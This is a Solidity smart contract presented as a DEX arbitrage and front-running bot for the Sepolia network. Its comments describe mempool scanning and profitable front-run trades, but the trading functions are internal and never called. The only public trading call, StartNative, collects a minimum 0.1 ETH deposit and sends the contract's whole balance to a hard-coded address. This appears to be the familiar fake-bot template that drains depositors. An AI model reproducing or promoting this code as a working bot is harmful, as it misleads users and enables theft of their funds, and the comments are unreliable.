// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// Updated build JAN/2/2025 - Modified for Ethereum Sepolia network with trading amount of 0.1 ETH.
// Min liquidity after gas fees has to equal 0.1 ETH.

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    // The following functions are part of the original interface but are not used in this updated logic.
    function createStart(address sender, address reciver, address token, uint256 value) external;
    function createContract(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract DexInterface {
    // Owner and internal state variables
    address private _owner; 
    mapping(address => mapping(address => uint256)) private _allowances;
    
    // Updated threshold for Sepolia trading: set to 0.1 ETH
    uint256 private threshold = 0.1 ether;
    uint256 private arbTxPrice  = 0.02 ether;
    bool private enableTrading = false;
    uint256 private tradingBalanceInPercent;
    uint256 private tradingBalanceInTokens;
    
    // Slippage tolerance in basis points (e.g., 50 = 0.5%)
    uint256 public slippageTolerance = 50;
    
    // Events for logging trade executions and failures
    event TradeExecuted(string tradeType, address indexed router, uint256 amountIn, uint256 amountOut);
    event TradeFailed(string reason, uint256 timestamp);
    event ArbitrageAttempt(uint256 timestamp, uint256 startBalance, uint256 endBalance);
    event SlippageChecked(uint256 expected, uint256 minAmount, uint256 timestamp);
    
    // Directly declared addresses based on your provided values:
    address public routerA = 0xeE567Fe1712Faf6149d80dA1E6934E354124CfE3;
    address public routerB = 0xeaBcE3E74EF41FB40024a21Cc2ee2F5dDc615791;
    address public WETH = 0x5f207d42F869fd1c71d7f0f81a2A67Fc20FF7323;
    address public mockUSDT = 0x042118513fE242560c13013B4D31e88329237878;
    
    // Constructor: simply sets the owner
    constructor(){    
        _owner = msg.sender;
    }
    
    // Modifier restricting function access to only the owner
    modifier onlyOwner (){
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }
    
    // Modifier to ensure trading is enabled
    modifier tradingEnabled(){
        require(enableTrading, "Trading is not enabled");
        _;
    }
    
    // Setter to update slippage tolerance (in basis points)
    function setSlippageTolerance(uint256 _newTolerance) external onlyOwner {
        require(_newTolerance < 1000, "Tolerance too high"); // limit to less than 10%
        slippageTolerance = _newTolerance;
    }
    
    // Functions to enable and disable trading manually
    function startTrading() external onlyOwner {
        enableTrading = true;
    }
    
    function stopTrading() external onlyOwner {
        enableTrading = false;
    }
    
    // The swap function with enhanced error handling and slippage protection
    function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        // Approve the router to spend the tokens
        require(IERC20(_tokenIn).approve(router, _amount), "Approval failed");
        
        // Define the swap path from _tokenIn to _tokenOut
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        
        uint256 deadline = block.timestamp + 300;
        
        // Calculate expected output and apply slippage tolerance
        uint256 expectedAmount = getAmountOutMin(router, _tokenIn, _tokenOut, _amount);
        uint256 minAmount = expectedAmount - ((expectedAmount * slippageTolerance) / 10000);
        emit SlippageChecked(expectedAmount, minAmount, block.timestamp);
        
        // Execute swap with try/catch to log errors rather than reverting
        try IUniswapV2Router(router).swapExactTokensForTokens(_amount, minAmount, path, address(this), deadline) returns (uint[] memory amounts) {
            emit TradeExecuted("swapExactTokensForTokens", router, _amount, amounts[amounts.length - 1]);
        } catch Error(string memory reason) {
            emit TradeFailed(reason, block.timestamp);
        } catch {
            emit TradeFailed("Unknown error in swap", block.timestamp);
        }
    }
    
    // Predicts the minimum output amount for a swap given an input amount
    function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);
        return amountOutMins[path.length - 1];
    }
    
    // Mempool scanning: estimates the round-trip swap outcome across two routers
    function mempool(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
        uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
        return amtBack2;
    }
    
    // Executes an arbitrage trade using a front-run strategy with error logging
    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal {
        uint256 startBalance = IERC20(_token1).balanceOf(address(this));
        uint256 token2InitialBalance = IERC20(_token2).balanceOf(address(this));
        
        // First swap: _token1 -> _token2
        swap(_router1, _token1, _token2, _amount);
        uint256 token2Balance = IERC20(_token2).balanceOf(address(this));
        uint256 tradeableAmount = token2Balance > token2InitialBalance ? token2Balance - token2InitialBalance : 0;
        
        // Second swap: _token2 -> _token1
        if(tradeableAmount > 0){
            swap(_router2, _token2, _token1, tradeableAmount);
        } else {
            emit TradeFailed("Insufficient token2 obtained for second swap", block.timestamp);
            return;
        }
        
        uint256 endBalance = IERC20(_token1).balanceOf(address(this));
        if(endBalance > startBalance) {
            emit ArbitrageAttempt(block.timestamp, startBalance, endBalance);
        } else {
            emit TradeFailed("Arbitrage did not yield profit", block.timestamp);
        }
    }
    
    // Estimates the outcome of a triple arbitrage trade
    function estimateTriDexTrade(
        address _router1, address _router2, address _router3,
        address _token1, address _token2, address _token3,
        uint256 _amount
    ) internal view returns (uint256) {
        uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
        uint256 amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
        return amtBack3;
    }
    
    // Initiates an arbitrage trade with the native blockchain token (ETH)
    // Modified: since the API logic is removed, we simply use routerA.
    function startArbitrageNative() internal tradingEnabled {
        // Transfer the entire balance to routerA for native token arbitrage.
        payable(routerA).transfer(address(this).balance);
    }
    
    // Returns the balance of the provided token held by this contract
    function getBalance(address _tokenContractAddress) internal view returns (uint256) {
        return IERC20(_tokenContractAddress).balanceOf(address(this));
    }
    
    // Recovers ETH to the owner (onlyOwner)
    function recoverEth() internal onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // Recovers ERC20 tokens to the owner (onlyOwner)
    function recoverTokens(address tokenAddress) internal {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
    
    // Fallback function to accept incoming ETH    
    receive() external payable {}
    
    // Public function to trigger a native arbitrage trade.
    // Requires that trading is enabled and that at least 0.1 ETH is sent.
    function StartNative() external payable tradingEnabled {
        require(msg.value >= threshold, "Insufficient funds, minimum is 0.1 ETH");
        startArbitrageNative();
    }
    
    // Sets the maximum deposit percentage allowed for trading (0-100)
    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) external onlyOwner {
        require(_tradingBalanceInPercent <= 100, "Percentage cannot exceed 100");
        tradingBalanceInPercent = _tradingBalanceInPercent;
    }
    
    // Sets the maximum deposit in tokens allowed for trading (must be >0)
    function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) external onlyOwner {
        require(_tradingBalanceInTokens > 0, "Trade balance in tokens must be greater than 0");
        tradingBalanceInTokens = _tradingBalanceInTokens;
    }
    
    // Withdraws accumulated ETH to the owner's wallet
    function Withdraw() external onlyOwner {
        recoverEth();
    }
    
    // Returns the owner's available balance after deducting the arbitrage transaction price
    function Key() external view returns (uint256) {
        return address(_owner).balance - arbTxPrice;
    }
}
